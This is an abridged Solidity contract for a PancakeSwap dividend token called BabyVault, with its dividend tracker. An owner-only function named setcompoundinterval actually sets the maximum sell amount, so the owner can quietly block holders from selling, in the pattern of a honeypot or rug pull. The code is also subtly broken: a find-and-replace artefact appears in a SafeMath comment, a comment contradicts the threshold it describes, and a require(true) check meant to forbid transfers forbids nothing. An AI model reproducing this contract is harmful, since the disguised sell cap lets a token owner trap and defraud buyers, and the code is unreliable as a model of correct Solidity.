...
library SafeMath {
    ...
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        ...
        // benefit is lost if 'b' is also BabyVaulted.
...
// File: contracts/BabyVaultDividendPayingToken.sol
...
// File: contracts/BabyVault.sol

// 

pragma solidity ^0.7.6;

contract BabyVault is ERC20, Ownable {
    using SafeMath for uint256;
	...
	address payable private MarketingWallet = payable(0xF79A7111C9801e3351C9e0802df5Bd0b7f1dfC21); // Marketing Address

	
    bool private swapping;

    BabyVaultDividendTracker public dividendTracker;

    address public liquidityWallet;

    uint256 private _CompoundInterval = 1000000000 * (10**18); 
    ...
    constructor() ERC20("BabyVault", "BBLVT") {
        ...
        dividendTracker = new BabyVaultDividendTracker();
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "BabyVault: The dividend tracker already has that address");

        BabyVaultDividendTracker newDividendTracker = BabyVaultDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "BabyVault: The new dividend tracker must be owned by the BabyVault token contract");
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "BabyVault: Account is already the value of 'excluded'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != PanCAKESwapV2Pair, "BabyVault: The PanCAKESwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "BabyVault: Automated market maker pair is already set to that value");
    ...
    function updateLiquidityWallet(address newLiquidityWallet) public onlyOwner {
        require(newLiquidityWallet != liquidityWallet, "BabyVault: The liquidity wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "BabyVault: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "BabyVault: Cannot update gasForProcessing to same value");
	...
	function setcompoundinterval(uint256 compoundinterval) external onlyOwner() {
        _CompoundInterval = compoundinterval;
    }
    ...
    function _transfer(
       ...
       if(from != owner()){
        ...
        if(!tradingOpen) {
            require(canTransferBeforetradingOpen[from], "BabyVault: This account cannot send tokens until trading is enabled");
        }
        ...
        if( 
            ...
            require(amount <= _CompoundInterval, "Sell transfer amount exceeds the setBuyBackUpperLimit.");
        }
...
contract BabyVaultDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() public DividendPayingToken("BabyVault_Dividend_Tracker", "BabyVault_Dividend_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**2); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) internal override {
        require(true, "BabyVault_Dividend_Tracker: No transfers allowed");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1 && newClaimWait <= 86400, "BabyVault_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "BabyVault_Dividend_Tracker: Cannot update claimWait to same value");
